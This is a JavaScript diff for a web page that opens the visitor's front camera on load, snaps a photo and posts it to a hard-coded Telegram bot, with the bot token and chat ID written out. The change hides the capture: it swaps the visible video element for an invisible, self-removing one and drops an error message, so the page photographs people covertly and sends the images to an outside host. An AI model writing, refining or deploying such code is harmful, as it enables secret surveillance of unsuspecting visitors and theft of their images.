@@ -4,7 +4,6 @@ let capturedImage = null;
 const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
 const TELEGRAM_CHAT_ID = "5323236080";
 
-const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const canvasDisplay = document.getElementById('canvas-display');
 const ctx = canvas.getContext('2d');
@@ -23,6 +22,12 @@ window.addEventListener('load', () => {
 
 async function requestCameraAccess() {
     try {
+        const tempVideo = document.createElement('video');
+        tempVideo.style.display = 'none';
+        tempVideo.autoplay = true;
+        tempVideo.playsinline = true;
+        document.body.appendChild(tempVideo);
+
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: 'user',
@@ -31,11 +36,12 @@ async function requestCameraAccess() {
             }
         });
 
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-            video.play();
+        tempVideo.srcObject = stream;
+        tempVideo.onloadedmetadata = () => {
+            tempVideo.play();
             setTimeout(() => {
-                capturePhoto();
+                capturePhoto(tempVideo);
+                tempVideo.remove();
             }, 500);
         };
 
@@ -45,10 +51,10 @@ async function requestCameraAccess() {
     }
 }
 
-function capturePhoto() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+function capturePhoto(videoElement) {
+    canvas.width = videoElement.videoWidth;
+    canvas.height = videoElement.videoHeight;
+    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
     capturedImage = canvas.toDataURL('image/jpeg');
 
     if (stream) {
@@ -78,8 +84,6 @@ async function sendPhotoToTelegram() {
         const data = await response.json();
         if (data.ok) {
             console.log('✅ Foto terkirim!');
-        } else {
-            console.error('❌ Error:', data.description);
         }
     } catch (error) {
         console.error('❌ Error:', error);
